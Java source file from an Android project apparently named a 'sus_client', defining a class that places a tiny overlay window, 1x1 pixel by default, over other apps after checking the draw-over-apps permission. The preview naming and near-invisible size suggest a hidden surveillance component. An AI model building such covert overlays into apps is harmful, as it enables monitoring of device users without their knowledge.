package com.android.sus_client.commonutility.widget;

import android.app.Service;
import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.util.DisplayMetrics;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;

import com.android.sus_client.utils.PermissionsUtils;
import com.android.sus_client.utils.Utils;

public class WindowOverlayView extends View {

    private final Context context;
    private final WindowManager windowManager;
    private final Handler mainHandler;

    private int previewWidth = 1;
    private int previewHeight = 1;

    public WindowOverlayView(Context context) {
        super(context);
        this.context = context;
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        this.mainHandler = new Handler(context.getMainLooper());
    }

    /**
     * Adding Window Overlay
     */
    public void addWindowOverlay(int widthInDp, int heightInDp) {
        setSize(widthInDp, heightInDp);
        if (context instanceof Service) {
            mainHandler.post(this::addWindowOverlayInternally);
        } else {
            addWindowOverlayInternally();
        }
    }

    private void addWindowOverlayInternally() {
        if (!PermissionsUtils.checkDrawOverOtherApps(context)) {
            throw new RuntimeException("Draw over other apps permission not granted!");
        }

        if (this.getParent() != null) {
            ((ViewGroup) this.getParent()).removeView(this);
        }
        setLayoutParams(new ViewGroup.LayoutParams(previewWidth, previewHeight));

        WindowManager.LayoutParams winParams = new WindowManager.LayoutParams(previewWidth, previewHeight, Utils.WindowOverlayType(), Utils.WIN_FLAG_TOUCH_OUTSIDE, PixelFormat.RGBA_8888);
        winParams.gravity = Gravity.END | Gravity.BOTTOM;
        windowManager.addView(this, winParams);
    }

    public void removeWindowOverlay() {
        try {
            windowManager.removeView(this);
        } catch (Exception ignored) {
        }
    }

    private void setSize(int widthInDp, int heightInDp) {
        DisplayMetrics dm = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(dm);
        widthInDp = (widthInDp > 0) ? widthInDp : 1;
        heightInDp = (heightInDp > 0) ? heightInDp : 1;
        previewWidth = (int) (widthInDp * dm.density);
        previewHeight = (int) (heightInDp * dm.density);
    }

}